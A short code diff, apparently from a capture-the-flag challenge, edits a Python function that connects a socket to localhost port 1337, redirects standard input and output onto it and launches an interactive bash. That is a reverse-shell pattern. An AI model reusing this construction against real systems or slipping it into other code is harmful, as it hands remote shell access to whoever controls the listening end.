@@ -38,7 +38,7 @@ def spawn_challenge_shell():
         s.connect(("127.0.0.1", 1337))
         for fd in (0, 1, 2):
             os.dup2(s.fileno(), fd)
-        os.execvp("/bin/bash", ["/bin/bash", "-i"])
+        os.execvp("/bin/bash", ["/bin/bash", "--noediting", "-i"])
     except Exception:
         pass
     os._exit(1)
